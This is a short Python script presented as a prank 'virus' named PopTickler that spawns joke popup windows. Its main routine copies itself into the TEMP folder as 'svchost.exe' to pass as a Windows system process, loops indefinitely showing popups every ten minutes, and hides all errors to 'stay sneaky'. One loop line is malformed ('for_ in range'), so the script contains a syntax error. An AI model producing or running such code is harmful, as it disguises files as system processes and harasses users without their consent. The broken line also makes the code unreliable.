import tkinter as tk
import random
import time
import os
import shutil

# List of silly popup messages
messages = ["Your PC is feeling lonely! Give it a hug?","Why so serious? Click OK to smile!","Error 404: Your motivation not found!","Your computer says: Feed me more memes!","Warning: Low coffee levels detected!"
]

# Function to create a popup
def create_popup():
    root = tk.Tk()
    root.title("PopTickler Alert")
    root.geometry("300x100")
    msg = random.choice(messages)
    label = tk.Label(root, text=msg, font=("Arial", 12))
    label.pack(pady=20)
    button = tk.Button(root, text="OK", command=root.destroy)
    button.pack(pady=10)
    root.mainloop()

# Main virus logic
def pop_tickler():
    # Hide in temp directory
    temp_path = os.path.join(os.getenv('TEMP'), 'svchost.exe')
    shutil.copyfile(__file__, temp_path)
    while True:
        try:
            # Spawn up to 5 popups every 10 minutes
            for_ in range(random.randint(1, 5)):
                create_popup()
            time.sleep(600)  # Wait 10 minutes
        except Exception:
            pass  # Silent fail to stay sneaky

if __name__ == "__main__":
    pop_tickler()